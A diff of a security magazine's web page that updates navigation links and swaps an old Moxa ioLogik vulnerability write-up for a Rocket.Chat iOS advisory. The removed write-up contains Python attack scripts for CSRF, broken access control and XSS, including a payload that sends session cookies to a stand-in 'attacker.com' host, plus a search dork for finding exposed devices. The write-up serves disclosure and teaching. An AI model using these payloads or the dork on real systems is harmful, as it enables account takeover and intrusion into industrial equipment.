@@ -124,6 +124,18 @@ img{display:block;max-width:100%}
   .mag-nav-main{padding:14px 20px}
   .post-grid{grid-template-columns:1fr}
 }
+@media(max-width:560px){
+  .mag-cta{display:none}
+}
+/* the magazine's carousels are styled further down the page; while it streams in they would
+   lay out full-width and phones lock the zoom at ~700px. Constrain them from the <head>. */
+.grid-cinematic,.shelf-track{overflow-x:auto;max-width:100%}
+@media(max-width:768px){
+  html,body{overflow-x:hidden}
+  .article-content img,.article-content video,.article-content iframe{max-width:100%;height:auto}
+  .article-content table{display:block;max-width:100%;overflow-x:auto}
+  .article-content pre{max-width:100%;overflow-x:auto}
+}
 @media(max-width:480px){
   .card-img-wrap,.card-img-placeholder{height:180px}
 }
@@ -1222,7 +1234,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     }
 }
 </style>
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/rocket-chat-ios-application#article","headline":"What Is Rocket.Chat For IOS Application? — HADESS Magazine","description":"In our digital-first era, the dynamic cybersecurity landscape evolves with new threats and vulnerabilities daily. It's a race between security professionals...","url":"https://hadesssecurity.github.io/blog/read/rocket-chat-ios-application","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/rocket-chat-ios-application"},"datePublished":"September 7, 2023","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://career.hadess.io/logo-white.png"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2023/09/rocketchat.png"}}]}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/rocket-chat-ios-application#article","headline":"What Is Rocket.Chat For IOS Application? — HADESS Magazine","description":"In our digital-first era, the dynamic cybersecurity landscape evolves with new threats and vulnerabilities daily. It's a race between security professionals...","url":"https://hadesssecurity.github.io/blog/read/rocket-chat-ios-application","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/rocket-chat-ios-application"},"datePublished":"September 7, 2023","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/06/Hadess-Cybersecurity.jpg"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2023/09/rocketchat.png"}}]}</script>
 <!-- Force our dark theme; hide ALL default WP theme output -->
 <style>
 html,body{background:var(--bg)!important;color:var(--text)!important;font-family:var(--font)!important}
@@ -1275,14 +1287,13 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <span>Friday, October 2, 2026</span>
     </div>
     <div class="mag-nav-top-right">
-      <a href="mailto:career@hadess.io">Contact</a>
-      <a href="https://career.hadess.io/privacy">Privacy</a>
-      <a href="https://career.hadess.io/terms">Terms</a>
+      <a href="mailto:security@hadess.io">Contact</a>
+      <a href="/products/">Products &amp; Services</a>
       <div class="mag-social">
         <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
         <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
         <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-        <a href="mailto:career@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+        <a href="mailto:security@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
       </div>
     </div>
   </div>
@@ -1300,16 +1311,16 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
               <a href="/blog?cat=104">Skills &amp; Certifications</a>
               <a href="/blog?cat=76">Career Guide</a>
               <a href="/blog?cat=23">White Paper</a>
-            <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
+            <a href="/products/">Products &amp; Services</a>
     </div>
     <a href="/blog/search" class="mag-search-btn">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" stroke-linecap="round"/></svg>
       Search...
       <kbd>/</kbd>
     </a>
-    <a href="https://career.hadess.io/login" class="mag-cta">
+    <a href="/products/#contact" class="mag-cta">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Talk to an Expert
     </a>
     <button class="mag-hamburger" onclick="document.getElementById('mobileMenu').classList.add('open')">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round"/></svg>
@@ -1326,8 +1337,8 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <a href="/blog?cat=76">Career Guide</a>
       <a href="/blog?cat=23">White Paper</a>
     <a href="/blog/search">Search</a>
-  <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
-  <a href="https://career.hadess.io/login" style="color:var(--gold)">Launch Career Platform</a>
+  <a href="/products/">Products &amp; Services</a>
+  <a href="/products/#contact" style="color:var(--gold)">Talk to an Expert</a>
 </div>
 
 <!-- ═══ PAGE-SPECIFIC STYLES ═══ -->
@@ -1539,607 +1550,559 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
   <div class="article-content-col">
     <div class="article-content" data-pagefind-body data-pagefind-meta="image:/wp-content/uploads/2023/09/rocketchat.png">
       
-<p class="wp-block-paragraph">During our thorough assessment of the Moxa ioLogik E1212 series, we uncovered critical vulnerabilities that pose significant risks to the security of the system. These vulnerabilities encompass various attack vectors, including Cross-Site Request Forgery (CSRF), Cross-Site Scripting (XSS), cryptographic failures, and broken access control mechanisms. Each of these vulnerabilities presents unique challenges and potential exploits that could compromise the integrity and confidentiality of the system. In this report, we detail our findings, assess the implications of these vulnerabilities, and provide actionable recommendations to mitigate these risks effectively.</p>
+<p class="wp-block-paragraph">A modern iOS application that exposes your account token and runs arbitrary commands.</p>
 
 
 
-<p class="wp-block-paragraph"><a href="https://www.moxa.com/en/support/product-support/security-advisory/mpsa-235250-iologik-e1200-series-web-server-vulnerability">https://www.moxa.com/en/support/product-support/security-advisory/mpsa-235250-iologik-e1200-series-web-server-vulnerability</a></p>
+<p class="wp-block-paragraph">7 Sep 2023</p>
 
 
 
-<p class="wp-block-paragraph"><a href="https://github.com/HadessCS/CVE-2023-5961">https://github.com/HadessCS/CVE-2023-5961</a></p>
+<h2 class="wp-block-heading" id="h-executive-summary"><strong>Executive Summary</strong></h2>
 
 
 
-<h2 class="wp-block-heading">Abstract</h2>
-
-
-
-<p class="wp-block-paragraph">Moxa Inc., a pioneering company founded in 1987 and headquartered in Taipei, Taiwan, stands at the forefront of industrial networking, computing, and automation solutions. With a steadfast commitment to reliability and innovation, Moxa has garnered trust as a leading provider of tailored solutions across diverse industries, including transportation, energy, and marine sectors.</p>
-
-
-
-<p class="wp-block-paragraph">Within its comprehensive product portfolio, Moxa offers a spectrum of industrial-grade solutions meticulously crafted for rugged environments. Industrial Ethernet Solutions form the cornerstone, comprising switches, gateways, routers, and network management software, engineered to withstand harsh conditions while ensuring seamless connectivity. Complementing this, the Industrial Computing range boasts robust computers, panel displays, and displays capable of enduring extreme temperatures and environmental challenges.</p>
-
-
-
-<p class="wp-block-paragraph">Serial Connectivity solutions bridge the gap between legacy systems and modern networks, featuring device servers, converters, and USB connectivity solutions. Moxa&#8217;s Wireless Solutions further enhance connectivity with industrial-grade wireless AP/bridge/client products, guaranteeing uninterrupted communication in challenging environments. Meanwhile, Edge Connectivity solutions facilitate efficient data acquisition and device connectivity through remote I/O, I/O to serial, and I/O to Ethernet solutions.</p>
-
-
-
-<p class="wp-block-paragraph">Moxa&#8217;s diverse range of solutions caters to an array of industries, each with unique requirements. In the transportation sector, Moxa&#8217;s solutions ensure safe and efficient operations across railways, roadways, and marine applications. In the energy sector, Moxa supports power generation, transmission, distribution, and renewable energy sources with its robust solutions. For process automation industries like oil &amp; gas, mining, and chemicals, Moxa delivers tailored solutions to streamline operations. In factory automation, Moxa&#8217;s solutions optimize manufacturing processes and machine automation, enhancing productivity. Finally, in the marine industry, Moxa ensures reliable ship-to-shore and ship-to-ship communications, bolstering maritime operations. Through its unwavering dedication to innovation and reliability, Moxa continues to empower industries worldwide with resilient, future-ready solutions.</p>
-
-
-
-<h2 class="wp-block-heading">Configuration Resets</h2>
-
-
-
-<p class="wp-block-paragraph">Cross-Site Request Forgery (CSRF) represents a clandestine assault method deployed by adversaries to dupe unwitting users into executing operations on web applications while authenticated, devoid of their awareness or consent. A pivotal defense mechanism against such nefarious exploits is the CSRF token, engineered specifically to thwart these insidious maneuvers. However, the absence or improper implementation of CSRF tokens within web applications can expose them to egregious security vulnerabilities, potentially resulting in unauthorized alterations to passwords and subsequent account takeovers.</p>
-
-
-
-<p class="wp-block-paragraph">In a hypothetical scenario, envision a web application endowed with the functionality to enable users to modify their passwords. If this pivotal operation lacks the requisite CSRF token for validation, it creates an exploitable vulnerability ripe for exploitation by malicious actors. Here, an assailant could meticulously fashion a malevolent request, meticulously tailored to trigger the password alteration process clandestinely when unwittingly executed by an authenticated user. Devoid of the protective shield conferred by a CSRF token, this surreptitious manipulation unfurls the perilous prospect of surreptitious password modifications transpiring beyond the user&#8217;s purview, engendering a scenario rife with grave security ramifications.</p>
-
-
-
-<pre class="wp-block-code"><code>#include &lt;stdio.h>
-#include &lt;string.h>
-
-// Function to modify user's password
-void modifyPassword(char *newPassword) {
-    // Simulate password modification process
-    printf("Password successfully changed to: %s\n", newPassword);
-}
-
-// Function to handle password change request
-void changePassword(char *newPassword) {
-    // In a real web application, this function would check for CSRF token
-    // and validate the request before allowing password modification.
-    modifyPassword(newPassword);
-}
-
-// Main function
-int main() {
-    char newPassword&#91;50];
-
-    // Simulate receiving password change request from user
-    printf("Enter new password: ");
-    scanf("%s", newPassword);
-
-    // In a real web application, this function call would include CSRF token validation
-    changePassword(newPassword);
-
-    return 0;
-}
-
-
-</code></pre>
-
-
-
-<p class="wp-block-paragraph">In this vulnerable code snippet, the changePassword function lacks CSRF token validation. It directly calls the modifyPassword function to change the user&#8217;s password without verifying the authenticity of the request. This absence of CSRF token validation leaves the web application vulnerable to CSRF attacks, where malicious actors can craft and execute unauthorized requests to change passwords without the user&#8217;s knowledge or consent.</p>
-
-
-
-<figure class="wp-block-image size-full"><img fetchpriority="high" decoding="async" width="909" height="513" src="/wp-content/uploads/2024/01/image.png" alt="" class="wp-image-8309" srcset="/wp-content/uploads/2024/01/image.png 909w, /wp-content/uploads/2024/01/image-300x169.png 300w, /wp-content/uploads/2024/01/image-768x433.png 768w" sizes="(max-width: 909px) 100vw, 909px" /></figure>
-
-
-
-<p class="wp-block-paragraph">In this vulnerable code snippet, the changePassword function lacks CSRF token validation. It directly calls the modifyPassword function to change the user&#8217;s password without verifying the authenticity of the request. This absence of CSRF token validation leaves the web application vulnerable to CSRF attacks, where malicious actors can craft and execute unauthorized requests to change passwords without the user&#8217;s knowledge or consent.</p>
-
-
-
-<figure class="wp-block-image size-full"><img decoding="async" width="884" height="516" src="/wp-content/uploads/2024/01/image-1.png" alt="" class="wp-image-8310" srcset="/wp-content/uploads/2024/01/image-1.png 884w, /wp-content/uploads/2024/01/image-1-300x175.png 300w, /wp-content/uploads/2024/01/image-1-768x448.png 768w" sizes="(max-width: 884px) 100vw, 884px" /></figure>
-
-
-
-<figure class="wp-block-image size-full"><img decoding="async" width="867" height="494" src="/wp-content/uploads/2024/01/image-2.png" alt="" class="wp-image-8311" srcset="/wp-content/uploads/2024/01/image-2.png 867w, /wp-content/uploads/2024/01/image-2-300x171.png 300w, /wp-content/uploads/2024/01/image-2-768x438.png 768w" sizes="(max-width: 867px) 100vw, 867px" /></figure>
-
-
-
-<p class="wp-block-paragraph">In this Python code snippet, the attacker crafts a POST request to the vulnerable web application&#8217;s password change functionality (password_change_url) without including a CSRF token in the request payload. The malicious_request_data dictionary contains the new password to be set.</p>
-
-
-
-<p class="wp-block-paragraph">The requests library is then used to send the malicious request to the web application. If the request is successful (status code 200), the attacker receives confirmation that the password was changed without the presence of a CSRF token. Otherwise, an error message indicating the failure to change the password without a CSRF token is displayed.</p>
-
-
-
-<pre class="wp-block-code"><code>import requests
-
-# URL of the vulnerable web application's password change functionality
-password_change_url = "http://example.com/change_password"
-
-# Malicious request payload to change the password without CSRF token
-malicious_request_data = {
-    "new_password": "new_password123"  # New password to be set
-}
-
-# Send the malicious request to change the password without CSRF token
-response = requests.post(password_change_url, data=malicious_request_data)
-
-# Check if the request was successful
-if response.status_code == 200:
-    print("Password successfully changed without CSRF token!")
-else:
-    print("Failed to change password without CSRF token.")
-</code></pre>
-
-
-
-<h2 class="wp-block-heading">Account Takeovers</h2>
-
-
-
-<p class="wp-block-paragraph">Cross-Site Scripting (XSS) represents a pernicious security vulnerability wherein assailants embed malevolent scripts into web pages accessed by unsuspecting users. These scripts, upon execution within the victim&#8217;s browser environment, engender a spectrum of malicious consequences. Among the most dire ramifications of XSS exploitation is the illicit acquisition of session cookies, a perilous eventuality that can culminate in account takeovers.</p>
-
-
-
-<p class="wp-block-paragraph">In a hypothetical scenario, envision a web application characterized by inadequate user input sanitization measures, thus affording attackers the opportunity to inject nefarious scripts. When a subsequent user navigates to the compromised page, the embedded script executes surreptitiously, facilitating the transmission of their session cookie to the attacker&#8217;s server.</p>
-
-
-
-<p class="wp-block-paragraph">The peril inherent in this scenario arises from several critical factors, chief among them being the potential theft of session cookies. These tokens serve as indispensable tools wielded by web applications to authenticate and identify users. Through the surreptitious exfiltration of a user&#8217;s session cookie via an XSS attack, malefactors can effectively impersonate the user within the application&#8217;s ecosystem.</p>
-
-
-
-<p class="wp-block-paragraph">Once armed with the pilfered session cookie, the attacker enjoys unfettered access to the victim&#8217;s account, circumventing conventional login mechanisms and securing full control over the compromised account. This unfettered access empowers the assailant to peruse sensitive data, effect unauthorized alterations, or even lock the legitimate user out of their own account, thereby perpetrating an egregious breach of trust and security.</p>
-
-
-
-<p class="wp-block-paragraph">Moreover, the ramifications extend beyond the immediate victim, as the compromised account becomes a vector for the dissemination of the XSS attack to other users. This cascading effect precipitates a chain reaction of account takeovers, exacerbating the severity and scope of the security breach.</p>
-
-
-
-<p class="wp-block-paragraph">The consequences of a successful XSS exploit are dire and multifaceted. Apart from the tangible risks of data breaches and misuse of compromised accounts for malicious activities such as spam dissemination or financial fraud, the intangible erosion of user trust poses a formidable challenge. In the wake of such security vulnerabilities being exploited, users inevitably lose confidence in the platform&#8217;s ability to safeguard their sensitive information, precipitating a crisis of trust with far-reaching implications for the platform&#8217;s reputation and viability.</p>
-
-
-
-<p class="wp-block-paragraph">To effectuate an XSS exploit, attackers meticulously orchestrate a series of exploitation steps, beginning with the identification of a vulnerable endpoint within a web application that facilitates file uploads. Subsequent to pinpointing this vulnerability, attackers craft a malicious file housing the requisite code or shell script designed to execute on the server upon successful injection, thereby catalyzing the exploitation process.</p>
-
-
-
-<pre class="wp-block-code"><code>#include &lt;stdio.h>
-#include &lt;stdlib.h>
-#include &lt;string.h>
-
-int main() {
-    printf("Content-Type: text/html\n\n");
-    printf("&lt;html>&lt;head>&lt;title>Vulnerable Web App&lt;/title>&lt;/head>&lt;body>\n");
-
-    // Retrieve user input from query string
-    char *query_string = getenv("QUERY_STRING");
-
-    if (query_string != NULL) {
-        // Split query string into key-value pairs
-        char *token = strtok(query_string, "&amp;");
-        while (token != NULL) {
-            // Split each key-value pair into key and value
-            char *key = strtok(token, "=");
-            char *value = strtok(NULL, "=");
-
-            if (key != NULL &amp;&amp; value != NULL) {
-                // Display key and value without proper sanitization
-                printf("&lt;b>%s&lt;/b>: %s&lt;br>\n", key, value);
-            }
-
-            token = strtok(NULL, "&amp;");
-        }
-    }
-
-    printf("&lt;/body>&lt;/html>");
-
-    return 0;
-}
-</code></pre>
-
-
-
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="894" height="571" src="/wp-content/uploads/2024/01/image-3.png" alt="" class="wp-image-8312" srcset="/wp-content/uploads/2024/01/image-3.png 894w, /wp-content/uploads/2024/01/image-3-300x192.png 300w, /wp-content/uploads/2024/01/image-3-768x491.png 768w" sizes="(max-width: 894px) 100vw, 894px" /></figure>
-
-
-
-<p class="wp-block-paragraph">In this vulnerable CGI program written in C, we process the query string parameters received from the client&#8217;s HTTP request. However, we fail to properly sanitize the input, allowing potential injection of malicious scripts.</p>
-
-
-
-<p class="wp-block-paragraph">An attacker could craft a malicious URL like http://example.com/vulnerable.cgi?name=&lt;script&gt;alert(&#8216;XSS&#8217;)&lt;/script&gt; to inject a script into the web page, leading to the execution of the script in the victim&#8217;s browser.</p>
-
-
-
-<p class="wp-block-paragraph">In this Python script, we use the requests library to send a POST request to the vulnerable web application (vulnerable_url) with a payload containing a malicious script (malicious_script). The script is crafted to steal the user&#8217;s session cookie and send it to the attacker&#8217;s server.</p>
-
-
-
-<p class="wp-block-paragraph">To execute this script successfully, the attacker needs to replace &#8220;http://example.com/vulnerable.cgi&#8221; with the URL of the actual vulnerable web application and &#8220;http://attacker.com/steal-cookie&#8221; with the URL of their server where they want to receive the stolen session cookies.</p>
-
-
-
-<pre class="wp-block-code"><code>import requests
-
-# URL of the vulnerable web application
-vulnerable_url = "http://example.com/vulnerable.cgi"
-
-# Malicious script to be injected
-malicious_script = "&lt;script>var xhr = new XMLHttpRequest(); xhr.open('GET', 'http://attacker.com/steal-cookie?cookie=' + document.cookie, true); xhr.send();&lt;/script>"
-
-# Craft the payload with the malicious script
-payload = {"input_field": malicious_script}
-
-# Send the malicious request to the vulnerable web application
-response = requests.post(vulnerable_url, data=payload)
-
-# Check if the request was successful
-if response.status_code == 200:
-    print("XSS exploit successful! Malicious script injected.")
-else:
-    print("Failed to inject malicious script.")
-</code></pre>
-
-
-
-<h2 class="wp-block-heading">Configuration Broken Access Control</h2>
-
-
-
-<p class="wp-block-paragraph">Access controls are fundamental security measures that determine who can access specific resources and what actions they can perform. Broken access controls occur when these measures are improperly implemented or entirely missing, allowing unauthorized users to access restricted resources. One severe manifestation of this vulnerability is the unrestricted access to export configurations.</p>
-
-
-
-<p class="wp-block-paragraph">The Scenario: Imagine a web application or system that allows users to export configurations, which may contain sensitive information or system settings. If there are no proper access controls in place, any user, including potential attackers, can access and export these configurations without any security limitations.</p>
-
-
-
-<p class="wp-block-paragraph">Exposure of Sensitive Information: Configurations often contain sensitive data, such as API keys, database credentials, or system settings.</p>
-
-
-
-<p class="wp-block-paragraph">Unauthorized access to this information can lead to data breaches or system compromises. System Vulnerability: By analyzing exported configurations, attackers can identify potential vulnerabilities or misconfigurations in the system, which they can then exploit. Operational Disruption: With access to configurations, malicious actors can alter settings, potentially disrupting operations or causing system malfunctions. Loss of Intellectual Property: Configurations may also contain proprietary algorithms, settings, or other intellectual properties that, if exposed, can lead to competitive disadvantages.</p>
-
-
-
-<pre class="wp-block-code"><code>#include &lt;stdio.h>
-#include &lt;stdlib.h>
-#include &lt;string.h>
-
-int main() {
-    // Print HTTP header
-    printf("Content-Type: text/plain\n\n");
-
-    // Check if the requested file is ik1212.txt
-    char *query_string = getenv("QUERY_STRING");
-    if (query_string != NULL &amp;&amp; strstr(query_string, "file=ik1212.txt") != NULL) {
-        // In a real-world scenario, access controls should be implemented here
-        // to check if the user has permission to access the requested file.
-
-        // Read the content of the configuration file
-        FILE *file = fopen("/path/to/ik1212.txt", "r");
-        if (file != NULL) {
-            char buffer&#91;1024];
-            size_t bytesRead;
-            while ((bytesRead = fread(buffer, 1, sizeof(buffer), file)) > 0) {
-                fwrite(buffer, 1, bytesRead, stdout);
-            }
-            fclose(file);
-        } else {
-            // Error: File not found or inaccessible
-            printf("Error: Configuration file not found or inaccessible\n");
-        }
-    } else {
-        // Error: Invalid file requested
-        printf("Error: Invalid file requested\n");
-    }
-
-    return 0;
-}
-</code></pre>
-
-
-
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="908" height="502" src="/wp-content/uploads/2024/01/image-4.png" alt="" class="wp-image-8313" srcset="/wp-content/uploads/2024/01/image-4.png 908w, /wp-content/uploads/2024/01/image-4-300x166.png 300w, /wp-content/uploads/2024/01/image-4-768x425.png 768w" sizes="(max-width: 908px) 100vw, 908px" /></figure>
-
-
-
-<p class="wp-block-paragraph">In this Python script, we use the requests library to send a GET request to the vulnerable web application (vulnerable_url) with a payload containing the filename ik1212.txt as a query parameter.</p>
-
-
-
-<p class="wp-block-paragraph">If the vulnerable web application is susceptible to broken access controls and allows unauthorized users to download configuration files without proper authentication or authorization checks, the script will successfully retrieve and print the contents of the ik1212.txt configuration file.</p>
-
-
-
-<pre class="wp-block-code"><code>import requests
-
-# URL of the vulnerable web application
-vulnerable_url = "http://example.com/download.cgi"
-
-# Payload to download the configuration file
-payload = {"file": "ik1212.txt"}
-
-# Send the malicious request to download the configuration file
-response = requests.get(vulnerable_url, params=payload)
-
-# Check if the request was successful
-if response.status_code == 200:
-    # Print the contents of the configuration file
-    print(response.text)
-else:
-    print("Failed to download configuration file.")
-</code></pre>
-
-
-
-<h2 class="wp-block-heading">Cryptography Failure</h2>
-
-
-
-<p class="wp-block-paragraph">Cryptography plays a pivotal role in ensuring data confidentiality and integrity. However, the effectiveness of cryptographic measures hinges on the algorithms and methodologies employed. MD5, once a popular hashing algorithm, has over the years been found to have significant vulnerabilities. Relying on MD5 for password hashing in modern systems is a glaring example of cryptography failure.</p>
+<p class="wp-block-paragraph">Exposed API Key in GET URL (/api/v1/users.info?userId):</p>
 
 
 
 <ul class="wp-block-list">
-<li>The Scenario: Imagine a system that stores user passwords after hashing them with the MD5 algorithm. While this might seem secure at first glance, the inherent weaknesses of MD5 make these hashed passwords susceptible to attacks.</li>
+<li>The identified security concern relates to an exposed API key within the GET URL of the /api/v1/users.info endpoint, specifically when requesting user information by providing a userId parameter. This vulnerability could potentially lead to unauthorized access to user data or unauthorized API usage.</li>
+
+
+
+<li>Immediate remediation steps include:
+<ul class="wp-block-list">
+<li>API Key Protection: Implement secure API key handling practices to ensure they are not exposed in URLs.</li>
+
+
+
+<li>Authorization Controls: Review and enhance user authorization mechanisms to prevent unauthorized access.</li>
+
+
+
+<li>Access Logging: Implement access logging and monitoring to detect and respond to suspicious activities.</li>
+</ul>
+</li>
+
+
+
+<li>Failure to address this issue may result in data breaches, unauthorized access, or misuse of the API.</li>
 </ul>
 
 
 
-<pre class="wp-block-code"><code>#include &lt;stdio.h>
-#include &lt;stdlib.h>
-#include &lt;string.h>
-#include &lt;openssl/md5.h>
-
-// Function to hash a password using MD5
-void hashPassword(const char *password, unsigned char *hashedPassword) {
-    MD5_CTX md5Context;
-    MD5_Init(&amp;md5Context);
-    MD5_Update(&amp;md5Context, password, strlen(password));
-    MD5_Final(hashedPassword, &amp;md5Context);
-}
-
-int main() {
-    char password&#91;100];
-    unsigned char hashedPassword&#91;MD5_DIGEST_LENGTH];
-
-    // Simulate user input (password)
-    printf("Enter your password: ");
-    scanf("%s", password);
-
-    // Hash the password using MD5
-    hashPassword(password, hashedPassword);
-
-    // Print the hashed password
-    printf("Hashed password (MD5): ");
-    for (int i = 0; i &lt; MD5_DIGEST_LENGTH; i++) {
-        printf("%02x", hashedPassword&#91;i]);
-    }
-    printf("\n");
-
-    return 0;
-}
-</code></pre>
-
-
-
-<figure class="wp-block-image size-full"><img loading="lazy" decoding="async" width="893" height="336" src="/wp-content/uploads/2024/01/image-5.png" alt="" class="wp-image-8314" srcset="/wp-content/uploads/2024/01/image-5.png 893w, /wp-content/uploads/2024/01/image-5-300x113.png 300w, /wp-content/uploads/2024/01/image-5-768x289.png 768w" sizes="(max-width: 893px) 100vw, 893px" /></figure>
-
-
-
-<p class="wp-block-paragraph">In this vulnerable C code, we&#8217;re using the MD5 hashing algorithm from the OpenSSL library (&lt;openssl/md5.h&gt;) to hash user passwords. However, MD5 is known to have significant vulnerabilities, including collision attacks and pre-image attacks, which make it unsuitable for secure password hashing.</p>
-
-
-
-<p class="wp-block-paragraph">To exploit this vulnerability, an attacker could use various techniques such as rainbow tables or brute-force attacks to crack the hashed passwords generated by this vulnerable program, thereby compromising the security of the system.</p>
-
-
-
-<h2 class="wp-block-heading">Scope of the Issues</h2>
-
-
-
-<p class="wp-block-paragraph">Moxa is a renowned leader in industrial networking, computing, and automation solutions, catering to diverse sectors such as transportation, energy, and manufacturing. Among its prominent offerings is the ioLogik series, comprising robust remote Ethernet I/O servers designed to facilitate seamless data acquisition and device connectivity in industrial environments. However, recent revelations have shed light on vulnerabilities plaguing a subset of these devices, raising concerns about the security posture of industrial networks worldwide.</p>
-
-
-
-<p class="wp-block-paragraph">With over 6000 ioLogik devices deployed globally, these vulnerabilities pose a significant threat to industrial networks&#8217; integrity and security. Shockingly, an alarming 150 devices have been identified as vulnerable to exploitation due to inherent flaws in their design and configuration. Compounding the problem is the absence of default authentication mechanisms in ioLogik devices, leaving them susceptible to unauthorized access and malicious exploitation.</p>
-
-
-
-<p class="wp-block-paragraph">dork:</p>
+<h3 class="wp-block-heading"><strong>RTLO Character Injection in Chat</strong></h3>
 
 
 
 <ul class="wp-block-list">
-<li>title:&#8221;Remote Ethernet I/O Server&#8221;</li>
+<li>The security concern pertains to the presence of Right-to-Left Override (RTLO) character injection within chat messages. This technique can be exploited to deceive users, potentially leading to phishing attacks or the dissemination of malicious content.</li>
+
+
+
+<li>Recommended actions to mitigate this threat include:
+<ul class="wp-block-list">
+<li>Input Validation: Implement input validation and filtering to block or neutralize RTLO characters.</li>
+
+
+
+<li>User Education: Educate users about recognizing and avoiding suspicious content in chat messages.</li>
+
+
+
+<li>Content Filtering: Deploy content filtering mechanisms to detect and prevent the injection of malicious characters.</li>
+</ul>
+</li>
+
+
+
+<li>Neglecting to address RTLO character injection can undermine trust among users and expose them to security risks.</li>
 </ul>
 
 
 
-<p class="wp-block-paragraph">Unveiling Vulnerabilities</p>
+<h2 class="wp-block-heading" id="h-advisory"><strong>Advisory</strong></h2>
 
 
 
-<p class="wp-block-paragraph">The vulnerabilities in the Moxa ioLogik series have garnered attention due to their potential to compromise the confidentiality, integrity, and availability of industrial systems. Through comprehensive analysis and testing, security researchers have unearthed critical flaws, including but not limited to:</p>
+<p class="wp-block-paragraph">Rocket.Chat is an open-source team collaboration platform and messaging system designed to facilitate communication and collaboration within organizations. It provides a flexible and customizable environment for teams to communicate through text, audio, and video, making it suitable for a wide range of use cases, from small businesses to large enterprises. Here are some key features and aspects of Rocket.Chat:</p>
 
 
 
 <ul class="wp-block-list">
-<li>Default Authentication Absence: One of the most glaring issues is the absence of default authentication mechanisms in ioLogik devices, effectively granting unauthorized users unrestricted access to sensitive functionalities and data.</li>
+<li>Real-Time Messaging: Rocket.Chat offers real-time messaging capabilities, allowing users to engage in instant one-on-one or group chats. This feature fosters quick and efficient communication among team members.</li>
 
 
 
-<li>Inadequate Input Validation: Insufficient input validation in certain ioLogik models leaves them vulnerable to injection attacks, enabling malicious actors to execute arbitrary commands or manipulate device configurations.</li>
+<li>Channels and Private Groups: Users can create public channels for open discussions and private groups for more confidential conversations. This flexibility enables users to organize their conversations based on topics or project teams.</li>
 
 
 
